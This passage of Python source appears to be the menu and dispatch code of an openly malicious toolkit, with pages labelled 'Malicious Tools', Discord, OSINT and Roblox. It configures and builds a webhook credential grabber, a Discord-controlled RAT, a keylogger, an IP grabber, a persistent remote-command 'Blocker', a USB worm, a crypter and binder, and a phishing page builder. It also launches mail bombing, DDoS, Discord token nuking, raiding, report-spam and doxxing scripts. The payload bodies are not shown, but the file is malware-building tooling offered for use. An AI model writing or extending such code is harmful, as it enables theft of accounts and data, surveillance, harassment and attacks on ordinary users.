        choice = get_inpt("Enter choice: ").strip()

        if choice == "99":
            break
        elif choice == "13":
            if input("Confirm clear? (y/n): ").strip().lower() == 'y':
                save_config({})
                config = {}
                print(f"{Fore.GREEN}[+] Settings cleared.{Style.RESET_ALL}")
                input("Press Enter...")
                continue
        elif choice.isdigit():
            stripped = choice.lstrip("0")
            theme_map = {
                "1": "snoop", "2": "snoop_neon", "3": "snoop_dark", "4": "snoop_holo",
                "5": "purple", "6": "blue", "7": "cyan", "8": "pink",
                "9": "rainbow", "10": "modern", "11": "modern_red", "12": "modern_purple"
            }
            if stripped in theme_map:
                new_theme = theme_map[stripped]
                config["theme"] = new_theme
                save_config(config)
                print(f"{Fore.GREEN}[+] Theme changed to: {new_theme.upper()}{Style.RESET_ALL}")
                input("Press Enter to apply...")
                continue
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

# -------------------------------------------------------------------
#  Page handlers for run_app()
# -------------------------------------------------------------------
def handle_page_0(choice):
    """Handle tools from Page 0 (Malicious Tools)."""
    if choice in ["1", "01"]:
        webhook = input("Webhook URL: ").strip()
        if not validate_url(webhook):
            print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        name = input("Output name [final_grabber]: ").strip() or "final_grabber"
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_grabber(webhook, name, icon, input("Python or EXE? (py/exe) [py]: ").strip().lower() == 'exe')
        input("\nPress Enter...")
    elif choice in ["2", "02"]:
        token = input(f"{Fore.YELLOW}Discord token: {Style.RESET_ALL}").strip()
        if not token:
            input("Token required. Press Enter...")
            return
        channel = input(f"{Fore.YELLOW}Channel ID: {Style.RESET_ALL}").strip()
        if not channel:
            input("Channel ID required. Press Enter...")
            return
        name = input("Output EXE name [WeasRAT]: ").strip() or "WeasRAT"
        console = input("Show console? (y/n) [n]: ").strip().lower() == 'y'
        onefile = input("Type: (1) Single file (2) Folder [1]: ").strip() != '2'
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_rat(token, channel, name, icon, console, onefile)
        config = load_config()
        config["rat_token"] = token
        config["rat_channel"] = channel
        save_config(config)
        input("\nPress Enter...")
    elif choice in ["3", "03"]:
        webhook = input(f"{Fore.YELLOW}Webhook URL: {Style.RESET_ALL}").strip()
        if not validate_url(webhook):
            print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        name = input("Output name [IPGrabber]: ").strip() or "IPGrabber"
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_ip_grabber(webhook, name, icon, input("Python or EXE? (py/exe) [py]: ").strip().lower() == 'exe')
        input("\nPress Enter...")
    elif choice in ["4", "04"]:
        webhook = input(f"{Fore.YELLOW}Webhook URL: {Style.RESET_ALL}").strip()
        if not validate_url(webhook):
            print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        name = input("Output name [Keylogger]: ").strip() or "Keylogger"
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_keylogger(webhook, name, icon, input("Python or EXE? (py/exe) [py]: ").strip().lower() == 'exe')
        input("\nPress Enter...")
    elif choice in ["5", "05"]:
        script = STUB_DIR / "crypto_wallet_scanner.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] crypto_wallet_scanner.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["6", "06"]:
        script = STUB_DIR / "mail_bomber.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] mail_bomber.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["7", "07"]:
        script = STUB_DIR / "ddos_advanced.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] ddos_advanced.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["8", "08"]:
        script = STUB_DIR / "vuln_scanner.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] vuln_scanner.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["9", "09"]:
        webhook = input(f"{Fore.YELLOW}Webhook URL (obligatoire): {Style.RESET_ALL}").strip()
        if not validate_url(webhook):
            print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        command_url = input(f"{Fore.YELLOW}Command URL (pastebin): {Style.RESET_ALL}").strip()
        if not validate_url(command_url):
            print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        check_interval = input(f"{Fore.YELLOW}Check interval (seconds, default 10): {Style.RESET_ALL}").strip()
        check_interval = int(check_interval) if check_interval.isdigit() else 10
        startup = input(f"{Fore.YELLOW}Startup persistence (True/False, default True): {Style.RESET_ALL}").strip().lower()
        if startup == '' or startup == 'true':
            startup = True
        else:
            startup = startup in ['yes', 'y', '1', 'true']
        self_destruct = input(f"{Fore.YELLOW}Self-destruct (days, default 14): {Style.RESET_ALL}").strip()
        self_destruct = int(self_destruct) if self_destruct.isdigit() else 14
        name = input(f"{Fore.YELLOW}Output name [Blocker]: {Style.RESET_ALL}").strip() or "Blocker"
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        as_exe = input("Python or EXE? (py/exe) [py]: ").strip().lower() == 'exe'
        build_blocker(webhook, command_url, name, check_interval, startup, self_destruct, icon, as_exe)
        input("\nPress Enter...")
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

def handle_page_1(choice):
    """Handle tools from Page 1 (Discord Tools)."""
    if choice in ["1", "01"]:
        script_path = STUB_DIR / "discord_selfbot.py"
        if script_path.exists():
            try:
                subprocess.run([sys.executable, str(script_path)], check=True)
            except Exception as e:
                print(f"{Fore.RED}[!] Error launching Selfbot: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] discord_selfbot.py not found in stub/{Style.RESET_ALL}")
        input("Press Enter...")
        return
    if choice in ["2", "02"]:
        script_path = STUB_DIR / "discord_raid.py"
        if script_path.exists():
            try:
                subprocess.run([sys.executable, str(script_path)], check=True)
            except Exception as e:
                print(f"{Fore.RED}[!] Error launching Raid: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] discord_raid.py not found in stub/{Style.RESET_ALL}")
        input("Press Enter...")
        return

    if not DISCORD_TOOLS_AVAILABLE:
        print(f"{Fore.RED}[!] discord_tools.py not available.{Style.RESET_ALL}")
        input("Press Enter...")
        return

    discord_actions = {
        '3':  dt.webhook_spam,
        '03': dt.webhook_spam,
        '4':  dt.webhook_delete,
        '04': dt.webhook_delete,
        '5':  dt.token_info,
        '05': dt.token_info,
        '6':  dt.token_login,
        '06': dt.token_login,
        '7':  dt.token_nuker,
        '07': dt.token_nuker,
        '8':  dt.token_rotator,
        '08': dt.token_rotator,
        '9':  dt.token_onliner,
        '09': dt.token_onliner,
        '10': dt.id_to_token,
        '11': dt.server_cloner,
        '12': dt.server_info_from_invite,
        '13': dt.username_checker,
        '14': dt.report_bot,
        '15': dt.bot_invite_gen,
    }

    if choice in discord_actions:
        try:
            discord_actions[choice]()
        except Exception as e:
            print(f"{Fore.RED}[!] Error executing Discord tool: {e}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

def handle_page_2(choice):
    """Handle tools from Page 2 (OSINT)."""
    osint_scripts = {'1':'osint_ip.py','01':'osint_ip.py','2':'osint_email.py','02':'osint_email.py',
                    '3':'osint_phone.py','03':'osint_phone.py','4':'osint_username.py','04':'osint_username.py',
                    '5':'osint_domain.py','05':'osint_domain.py','6':'osint_dns.py','06':'osint_dns.py',
                    '7':'osint_subdomain.py','07':'osint_subdomain.py','8':'port_scanner.py','08':'port_scanner.py',
                    '9':'osint_shodan.py','09':'osint_shodan.py','10':'osint_wayback.py',
                    '11':'osint_social.py','12':'osint_emailverif.py','13':'osint_pastebin.py',
                    '14':'osint_geo.py','15':'dox_creator.py'}
    if choice in osint_scripts:
        script_path = STUB_DIR / osint_scripts[choice]
        if script_path.exists():
            try: subprocess.run([sys.executable, str(script_path)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] Script {osint_scripts[choice]} not found{Style.RESET_ALL}")
        input("Press Enter...")
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

def handle_page_3(choice):
    """Handle tools from Page 3 (Tools)."""
    if choice in ["1", "01"]:
        exe1 = input("Path to 1st EXE: ").strip()
        exe2 = input("Path to 2nd EXE: ").strip()
        build_binder(exe1, exe2, input("Output name [Binded]: ").strip() or "Binded")
        input("\nPress Enter...")
    elif choice in ["2", "02"]:
        build_crypter(input("Path to EXE to crypt: ").strip(), input("Output name [Crypted]: ").strip() or "Crypted")
        input("\nPress Enter...")
    elif choice in ["3", "03"]:
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_fusion(input("Output name [FusionRAT]: ").strip() or "FusionRAT", icon)
        input("\nPress Enter...")
    elif choice in ["4", "04"]:
        token = input(f"{Fore.YELLOW}Discord token: {Style.RESET_ALL}").strip()
        channel = input(f"{Fore.YELLOW}Channel ID: {Style.RESET_ALL}").strip()
        if not token or not channel:
            print(f"{Fore.RED}[!] Token and channel required.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_crypted_rat(token, channel, input("Output EXE name [CryptedRAT]: ").strip() or "CryptedRAT", icon,
                         input("Show console? (y/n) [n]: ").strip().lower() == 'y')
        input("\nPress Enter...")
    elif choice in ["5", "05"]:
        webhook = input(f"{Fore.YELLOW}Webhook URL: {Style.RESET_ALL}").strip()
        if not validate_url(webhook):
            print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
            input("Press Enter...")
            return
        icon = None
        if input("Add icon? (y/n) [n]: ").strip().lower() == 'y':
            icon = select_icon()
        build_crypted_grabber(webhook, input("Output EXE name [CryptedGrabber]: ").strip() or "CryptedGrabber", icon,
                             input("Show console? (y/n) [n]: ").strip().lower() == 'y')
        input("\nPress Enter...")
    elif choice in ["6", "06"]:
        build_usb_worm()
        input("\nPress Enter...")
    elif choice in ["7", "07"]:
        build_network_scanner()
        input("\nPress Enter...")
    elif choice in ["8", "08"]:
        build_phishing_page()
        input("\nPress Enter...")
    elif choice in ["9", "09"]:
        script = STUB_DIR / "proxy_scraper.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] proxy_scraper.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["10"]:
        script = STUB_DIR / "proxy_checker.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] proxy_checker.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["11"]:
        script = STUB_DIR / "website_cloner.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] website_cloner.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    elif choice in ["12"]:
        script = STUB_DIR / "python_obfuscator.py"
        if script.exists():
            try: subprocess.run([sys.executable, str(script)], check=True)
            except Exception as e: print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        else: print(f"{Fore.RED}[!] python_obfuscator.py not found{Style.RESET_ALL}")
        input("Press Enter...")
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

def handle_page_4(choice):
    """Handle tools from Page 4 (Login)."""
    if choice in ["1", "01"]:
        token = input(f"{Fore.YELLOW}Discord token: {Style.RESET_ALL}").strip()
        if token: discord_token_login(token)
        else: input("No token. Press Enter...")
    elif choice in ["2", "02"]:
        cookie_login()
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

def handle_page_5(choice):
    """Handle tools from Page 5 (Roblox)."""
    if choice in ["1", "01", "2", "02", "3", "03", "4", "04", "5", "05", "6", "06", "7", "07", "8", "08", "9", "09"]:
        run_roblox_tools()
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        input("Press Enter...")

# -------------------------------------------------------------------
#  Main application loop
# -------------------------------------------------------------------
def run_app():
    """Main application loop with paginated dashboard."""
    config = load_config()
    current_page = 0

    while True:
        if current_page == 6:
            settings_menu()
            current_page = 0
            continue

        PaginatedUI.draw_dashboard(current_page)
        choice = get_inpt().strip().lower()

        # Navigation
        if choice in ("n", "d"):
            current_page = (current_page + 1) % len(PAGES)
            continue
        elif choice in ("b", "a"):
            current_page = (current_page - 1) % len(PAGES)
            continue
        elif choice == "e":
            clr()
            print(f"{Fore.CYAN}Goodbye.{Style.RESET_ALL}")
            break
        elif choice in ("1", "2", "3", "4", "5", "6", "7"):
            current_page = int(choice) - 1
            continue
        elif not choice:
            continue

        # Global commands
        if choice == "h":
            help_menu()
            continue
        elif choice == "v":
            version_menu()
            continue
        elif choice == "s":
            settings_menu()
            current_page = 0
            continue

        # Page-specific handlers
        if current_page == 0:
            handle_page_0(choice)
        elif current_page == 1:
            handle_page_1(choice)
        elif current_page == 2:
            handle_page_2(choice)
        elif current_page == 3:
            handle_page_3(choice)
        elif current_page == 4:
            handle_page_4(choice)
        elif current_page == 5:
            handle_page_5(choice)
        else:
            print(f"{Fore.RED}[!] Invalid page.{Style.RESET_ALL}")
            input("Press Enter...")

# -------------------------------------------------------------------
#  Entry point
# -------------------------------------------------------------------
if __name__ == '__main__':
    init_os()
    boot_anim()
    try:
        webbrowser.open("https://discord.gg/snoop")
    except:
        pass
    run_app()